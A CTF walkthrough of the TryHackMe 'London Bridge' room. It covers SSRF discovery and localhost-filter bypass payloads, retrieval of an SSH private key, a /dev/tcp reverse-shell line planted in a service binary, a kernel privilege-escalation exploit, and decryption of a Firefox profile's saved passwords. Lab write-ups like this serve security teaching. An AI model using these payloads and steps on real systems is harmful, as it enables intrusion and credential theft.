---
title: "TryHackMe: The London Bridge"
author: cilgin
date: 2025-07-09 16:34:38 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Medium]
pin: false
math: false
mermaid: false
image:
  path: /assets/img/2025-07-09-TryHackMe-The_London_Bridge/main.webp
---

Hey everyone! Today, I'm tackling the [The London Bridge](https://tryhackme.com/room/thelondonbridge) room on TryHackMe. The goal is to see if we can make this bridge fall down (metaphorically, of course!). So grab a cup of tea, and let's get hacking!

---

### Step 1: Reconnaissance - Knocking on the Door

First things first, let's set our target IP address. This makes life way easier than typing it out every single time.

```bash
export IP=10.10.22.48
```

```bash
❯ nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-09 13:55 +0300
Nmap scan report for 10.10.22.48
Host is up (0.070s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA)
|   256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA)
|_  256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519)
8080/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Explore London
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.48 seconds
```

Let's fire up a browser and see what's happening on `http://$IP:8080`.

![Desktop View](/assets/img/2025-07-09-TryHackMe-The_London_Bridge/photo1.webp){: width="1261" height="544" }

It's a charming little tourist site about London. How quaint! Now, let's see what's hiding under the surface.

### Step 2: Enumeration - Fuzzing for Secrets

A pretty website is nice, but we're here for the hidden directories. Time to unleash `gobuster` with a common wordlist to see what we can find.

```bash
❯ gobuster dir -w common.txt -u http://$IP:8080/ -x md,js,html,php,py,css,txt,bak -t 50
===============================================================
Gobuster v3.7
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.22.48:8080/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.7
[+] Extensions:              css,txt,bak,md,js,html,php,py
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/contact              (Status: 200) [Size: 1703]
/feedback             (Status: 405) [Size: 178]
/gallery              (Status: 200) [Size: 1722]
/upload               (Status: 405) [Size: 178]
Progress: 42651 / 42651 (100.00%)
===============================================================
Finished
===============================================================
```

Interesting results! The `/gallery` page looks like a good place to start. Let's head over there.

![Desktop View](/assets/img/2025-07-09-TryHackMe-The_London_Bridge/photo2.webp){: width="357" height="117" }

The gallery page has a file upload form, which corresponds to the `/upload` endpoint we found. This is where things usually get fun. Let's capture a legitimate upload request with Burp Suite to see how it works.

![Desktop View](/assets/img/2025-07-09-TryHackMe-The_London_Bridge/photo3.webp){: width="784" height="340" }

I threw everything but the kitchen sink at this upload form. I tried uploading Python shells with `.jpg` extensions, manipulating magic bytes, and even embedding a Python reverse shell into an image's EXIF data. Nothing worked. The server was surprisingly picky and would only accept genuine image files.

Feeling a bit stuck, I decided to go back to basics and view the page source. Sometimes, developers leave little presents for us...

```html
    </div>
    <h5>Visited London recently? Contribute to the gallery</h5>
    <form method="POST" action="/upload" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="Upload">
    </form>
    <!-To devs: Make sure that people can also add images using links->
```

Aha! A developer comment! `<!--To devs: Make sure that people can also add images using links-->`. This suggests there's another functionality, probably on an endpoint we haven't found yet. Our `common.txt` wordlist was too... well, *common*. Let's bring out the big guns: `big.txt`.

```bash
❯ gobuster dir -w big.txt -u http://$IP:8080/ -x md,js,html,php,py,css,txt,bak -t 50
===============================================================
Gobuster v3.7
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.22.48:8080/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.7
[+] Extensions:              css,txt,bak,md,js,html,php,py
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/contact              (Status: 200) [Size: 1703]
/feedback             (Status: 405) [Size: 178]
/gallery              (Status: 200) [Size: 1904]
/upload               (Status: 405) [Size: 178]
/view_image           (Status: 405) [Size: 178]
Progress: 184221 / 184221 (100.00%)
===============================================================
Finished
===============================================================
```

Bingo! We found `/view_image`. That has to be related to the developer's comment. Let's check it out with `curl`.

```bash
❯ curl $IP:8080/view_image
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>405 Method Not Allowed</title>
<h1>Method Not Allowed</h1>
<p>The method is not allowed for the requested URL.</p>
```

A `405 Method Not Allowed` error on a `GET` request is a classic sign that the endpoint is expecting a different HTTP verb, most likely `POST`. Let's try that.

```bash
❯ curl -X POST $IP:8080/view_image
<!DOCTYPE html>
<html lang="en">
...
<body>
    <h1>View Image</h1>
    <form action="/view_image" method="post">
        <label for="image_url">Enter Image URL:</label><br>
        <input type="text" id="image_url" name="image_url" required><br><br>
        <input type="submit" value="View Image">
    </form>
</body>
</html>
```

Success! A `POST` request returns a form asking for an `image_url`. This is the feature the developer was talking about. Let's test it with a valid image link to confirm it works.

```bash
❯ curl -X POST http://$IP:8080/view_image \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "image_url=https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/Example.png/640px-Example.png"
<!DOCTYPE html>
<html lang="en">
...
<body>
...
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/70/Example.png/640px-Example.png" alt="User provided image">
</body>
</html>
```

It works perfectly. The server fetches the image from the URL we provide and displays it. This functionality is a textbook example of a **Server-Side Request Forgery (SSRF)** vulnerability. The server is making a web request on our behalf!

### Step 3: Exploitation - SSRF Shenanigans

The obvious `image_url` parameter works, but are there any hidden ones? Let's fuzz for parameters using `ffuf`. We'll use `FUZZ` as a placeholder for the parameter name.

```bash
❯ ffuf -w common.txt -X POST -u 'http://10.10.22.48:8080/view_image' -H 'Content-Type: application/x-www-form-urlencoded' -d 'FUZZ=/uploads/04.jpg' -fw 226
# Here we're fuzzing for parameter names, not directories.

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.22.48:8080/view_image
 :: Wordlist         : FUZZ: /home/cilgin/dev/wordlist/common.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : FUZZ=/uploads/04.jpg
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 226
________________________________________________

www                     [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 83ms]
:: Progress: [4739/4739] :: Job [1/1] :: 555 req/sec :: Duration: [0:00:09] :: Errors: 0 ::
```

Look at that! The parameter `www` gives a different response (a `500` error, but different is good!). Let's confirm our SSRF by making the server connect back to us. First, we'll start a simple web server on our machine.

```bash
❯ sudo python -m http.server 80
```

Now, we'll use the `www` parameter to tell the target to visit our server.

```bash
❯ curl -X POST http://$IP:8080/view_image \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "www=http://10.21.206.128" # Replace with your TryHackMe IP
<!DOCTYPE HTML>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Directory listing for /</title>
</head>
<body>
<h1>Directory listing for /</h1>
<hr>
<ul>
<li><a href="common.txt">common.txt</a></li>
</ul>
<hr>
</body>
</html>
```

It worked! The response contains the directory listing from my local Python server. The SSRF is 100% confirmed. Now for the real prize: can we access internal services on the target machine? Let's try to access `localhost`.

```bash
❯ curl -X POST http://$IP:8080/view_image \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "www=http://127.0.0.1:"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>You don&#x27;t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>
```

Denied! It seems there's a filter in place to block common `localhost` addresses. But fear not, there are many ways to say `localhost`. Let's use a wordlist of common SSRF bypasses, which you can find in great resources like [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md).

I created a file `ssrf.txt` with a list of bypasses.

<details>
<summary>Click to see the ssrf.txt wordlist</summary>

```text
127.0.0.1:80
127.0.0.1:443
127.0.0.1:22
127.1:80
0
0.0.0.0:80
localhost:80
[::]:80/
[::]:25/ SMTP
[::]:3128/ Squid
[0000::1]:80/
[0:0:0:0:0:ffff:127.0.0.1]/thefile
①②⑦.⓪.⓪.⓪
127.127.127.127
127.0.1.3
127.0.0.0
2130706433/
017700000001
3232235521/
3232235777/
0x7f000001/
0xc0a80014/
{domain}@127.0.0.1
127.0.0.1#{domain}
{domain}.127.0.0.1
127.0.0.1/{domain}
127.0.0.1/?d={domain}
{domain}@127.0.0.1
127.0.0.1#{domain}
{domain}.127.0.0.1
127.0.0.1/{domain}
127.0.0.1/?d={domain}
{domain}@localhost
localhost#{domain}
{domain}.localhost
localhost/{domain}
localhost/?d={domain}
127.0.0.1%00{domain}
127.0.0.1?{domain}
127.0.0.1///{domain}
127.0.0.1%00{domain}
127.0.0.1?{domain}
127.0.0.1///{domain}st:+11211aaa
st:00011211aaaa
0/
127.1
127.0.1
1.1.1.1 &@2.2.2.2# @3.3.3.3/
127.1.1.1:80\@127.2.2.2:80/
127.1.1.1:80\@@127.2.2.2:80/
127.1.1.1:80:\@@127.2.2.2:80/
127.1.1.1:80#\@127.2.2.2:80/
```

</details>

Now let's throw this list at the `www` parameter with `ffuf`.

```bash
❯ ffuf -u http://$IP:8080/view_image -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "www=http://FUZZ" \
     -w ssrf.txt -fw 27
# Fuzzing the URL itself with our bypass list.

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.22.48:8080/view_image
 :: Wordlist         : FUZZ: /home/cilgin/dev/wordlist/ssrf.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : www=http://FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 27
________________________________________________

[::]:80/                [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 105ms]
[::]:25/ SMTP           [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 116ms]
[::]:3128/ Squid        [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 116ms]
2130706433/             [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 117ms]
127.0.0.0               [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 130ms]
0                       [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 137ms]
...
127.1                   [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 77ms]
...
```

We have multiple winners! Payloads like `127.1`, `0`, and `017700000001` (the octal representation of 127.0.0.1) all bypassed the filter. Let's use `127.1` because it's nice and clean.

```bash
❯ curl -X POST http://$IP:8080/view_image \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "www=http://127.1"
<HTML>
<body bgcolor="gray">
<h1>London brigde</h1>
<img height=400px width=600px src ="static/1.webp"><br>
<font type="monotype corsiva" size=18>London Bridge is falling down<br>
...
</font>
</body>
</HTML>
```

This reveals a hidden website on port 80 of the local machine, filled with the creepy "London Bridge is falling down" nursery rhyme. This confirms there's another web server running internally.

Let's see what else is being served on this internal port 80. Could it be... a file system? Let's fuzz for common files and directories.

```bash
❯ ffuf -u http://$IP:8080/view_image -X POST \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "www=http://127.1:80/FUZZ" -w common.txt -fw 96

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.22.48:8080/view_image
 :: Wordlist         : FUZZ: /home/cilgin/dev/wordlist/common.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : www=http://127.1:80/FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 96
________________________________________________

.bash_history           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 75ms]
.bashrc                 [Status: 200, Size: 3771, Words: 522, Lines: 118, Duration: 144ms]
.cache                  [Status: 200, Size: 474, Words: 19, Lines: 18, Duration: 176ms]
.env                    [Status: 200, Size: 533, Words: 22, Lines: 21, Duration: 171ms]
.profile                [Status: 200, Size: 807, Words: 128, Lines: 28, Duration: 112ms]
.ssh                    [Status: 200, Size: 399, Words: 18, Lines: 17, Duration: 106ms]
index.html              [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 81ms]
...
```

Whoa! This isn't a normal web root. It looks like the internal web server is serving a user's entire home directory! This is a massive misconfiguration. With a `.ssh` directory exposed, the path forward is clear.

### Step 4: Gaining a Foothold

Let's list the contents of the `.ssh` directory.

```bash
❯ curl -X POST http://$IP:8080/view_image \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "www=http://127.1/.ssh"
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>Directory listing for /.ssh/</title>
</head>
<body>
<h1>Directory listing for /.ssh/</h1>
<hr>
<ul>
<li><a href="authorized_keys">authorized_keys</a></li>
<li><a href="id_rsa">id_rsa</a></li>
</ul>
<hr>
</body>
</html>
```

The holy grail, `id_rsa`, is right there for the taking. Let's grab it.

```bash
❯ curl -X POST http://$IP:8080/view_image \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "www=http://127.1/.ssh/id_rsa"
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAz1yFrg9FAZAI4R37aQWn/ePTk/MKfz2KQ+OE45KErguL34Yj
5Kc1VJjDTTNRmc+vNRZieC8EwelWgpwcKACa70Ke2q/7zRLWHh23OUxWiSAAORTe
...
7MDu4QKBgFIomwhD+jmr3Vc2HutYkl3zliSD239sH3k118sTHbedvKH5Q7nw0C+U
a7RMp/cXWZKdyRgFxQ7DQEorzWi5bLAyxXnMg0ghwWdf4nugQmaEG7t+OYUNsf7M
fDLzMA915WcODR6L0mWO0crAMbZQOkg1KlAiwQSQmuUpPqyAfq6x
-----END RSA PRIVATE KEY-----
```

Jackpot! We have the private key. But who does it belong to? We could try to read `/etc/passwd` with a Local File Inclusion payload like `../../../../../etc/passwd`, but that fails.

```bash
❯ curl -X POST http://$IP:8080/view_image \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "www=http://127.1/../../../../../etc/passwd"
# This gives a 404, so no LFI here.
```

No worries. The other file in the `.ssh` directory, `authorized_keys`, often contains the username in a comment.

```bash
❯ curl -X POST http://$IP:8080/view_image \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "www=http://127.1/.ssh/authorized_keys"
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPXIWuD0UBkAjhHftpBaf949OT8wp/PYpD44TjkoSuC4vfhiPkpzVUmMNNM1GZz681FmJ4LwTB6VaCnBwoAJrvQp7ar/vNEtYeHbc5TFaJIAA5FN5rWzl66zeCFNaNx841E4CQSDs7dew3CCn3dRQHzBtT4AOlmcUs9QMSsUqhKn53EbivHCqkCnqZqqwTh0hkd0Cr5i3r/Yc4REqsVaI41Cl3pkDxrfbmhZdjxRpES8pO5dyOUvnq3iJZDOxFBsG8H4RODaZrTW78eZbcz1LKug/KlwQ6q8+e4+mpcdm7sHAAszk0eFcI2a37QQ4Fgq96OwMDo15l8mDDrk1Ur7aF beth@london
```

And there it is: `beth@london`. Now we have the key and the username. Let's log in!
*(Note: I saved the key as `beth.ssh` and set the correct permissions with `chmod 600 beth.ssh`)*.

```bash
❯ ssh -i beth.ssh beth@$IP
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)
...
Last login: Mon May 13 22:38:30 2024 from 192.168.62.137
beth@london:~$
```

We're in! A quick look at the `/home` directory reveals another user.

```bash
beth@london:/home$ ls -la
total 16
drwxr-xr-x  4 root    root    4096 Mar 10  2024 .
drwxr-xr-x 23 root    root    4096 Apr  7  2024 ..
drwxr-xr-x 11 beth    beth    4096 May  7  2024 beth
drw-------  3 charles charles 4096 Apr 23  2024 charles
```

Hello, `charles`. We'll be paying you a visit soon. But first, let's grab the user flag.

```bash
beth@london:~$ cat __pycache__/user.txt
THM{****_****_***_******}
```

### Step 5: Privilege Escalation - To the Root!

Time for privilege escalation. A quick run of `linpeas.sh` revealed a very interesting finding related to a systemd service.

```
/etc/systemd/system/multi-user.target.wants/app.service is calling this writable executable: /home/beth/
```

Let's inspect that service file.

```bash
beth@london:/tmp$ cat /etc/systemd/system/multi-user.target.wants/app.service
[Unit]
Description=My service
After=multi-user.target

[Service]
Type=simple
Restart=always
WorkingDirectory=/home/beth
Environment="PATH=/home/beth"
ExecStart=/home/beth/.local/bin/gunicorn --config gunicorn_config.py app:app

[Install]
WantedBy=multi-user.target
```

This is a classic privesc vector. The service runs the `gunicorn` executable from `/home/beth/.local/bin/`, a directory we control! We can simply replace `gunicorn` with a reverse shell payload.

```bash
beth@london:~$ cd .local/bin/
beth@london:~/.local/bin$ mv gunicorn gunicorn.bak # Backup the original
beth@london:~/.local/bin$ echo "/bin/bash -i >& /dev/tcp/10.21.206.128/4444 0>&1" > gunicorn # Create our evil gunicorn
beth@london:~/.local/bin$ chmod +x gunicorn # Make it executable
```

I set up a listener, but couldn't find a way to restart the service to trigger the payload. My attempts to kill the existing `gunicorn` process were unsuccessful.
You could get shell by this method if you know how to kill gunicorn's process. I didn't get the shell this way.

However, `linpeas` also pointed out that the kernel is ancient and vulnerable.

```bash
beth@london:~$ uname -a
Linux london 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

This version is vulnerable to CVE-2018-18955. I found a great exploit script for it on Exploit-DB: [47166.sh](https://www.exploit-db.com/exploits/47166). This exploit abuses `subuid` mapping and a D-Bus service to create a SUID root shell for us.

After running the script, it dropped a root shell right in my lap.

```bash
beth@london:/tmp$ ./pwn.sh
...
[+] Success:
-rwsr-xr-x 1 root root 8384 Jul  9 07:12 /tmp/sh
[*] Cleaning up...
[*] Launching root shell: /tmp/sh
# id
uid=0(root) gid=1001(beth) groups=1001(beth)
# cat /root/.root.txt
THM{************************}
```
And we are root!

### Bonus Round: What's Charles Hiding?

We're root, but I can't shake the feeling we left something behind. What about the other user, `charles`? As root, we can now freely explore his home directory.

```bash
root@london:/root# ls -la /home/charles
total 24
drw------- 3 charles charles 4096 Apr 23  2024 .
drwxr-xr-x 4 root    root    4096 Mar 10  2024 ..
lrwxrwxrwx 1 root    root       9 Apr 23  2024 .bash_history -> /dev/null
-rw------- 1 charles charles  220 Mar 10  2024 .bash_logout
-rw------- 1 charles charles 3771 Mar 10  2024 .bashrc
drw------- 3 charles charles 4096 Mar 16  2024 .mozilla
-rw------- 1 charles charles  807 Mar 10  2024 .profile
```

That `.mozilla` directory looks very promising. It likely contains Firefox browser data, including saved passwords. Let's exfiltrate it and see what we can find. I used `tar` to archive the directory, then downloaded it to my local machine with a Python web server.

```bash
# On the target machine
root@london:/home/charles# tar -czvf mozilla.tar.gz .mozilla
root@london:/home/charles# python3 -m http.server 8000

# On my local machine
❯ wget http://10.10.22.48:8000/mozilla.tar.gz
❯ tar -xzvf mozilla.tar.gz
```

Now, with the Firefox profile on my machine, I used the amazing [unode/firefox_decrypt](https://github.com/unode/firefox_decrypt) tool to extract any saved credentials.

```bash
❯ chmod -R 777 .mozilla
❯ python firefox_decrypt.py .mozilla/firefox/8k3bf3zp.charles
2025-07-09 16:16:28,114 - WARNING - profile.ini not found in .mozilla/firefox/8k3bf3zp.charles
2025-07-09 16:16:28,114 - WARNING - Continuing and assuming '.mozilla/firefox/8k3bf3zp.charles' is a profile location

Website:   https://www.buckinghampalace.com
Username: 'Charles'
Password: '**************'
```

And there we have it! Charles's password for Buckingham Palace. A fitting end to our tour of London.

This was a really fun box with a great SSRF vulnerability leading to a home directory exposure. Thanks for reading, and happy hacking!
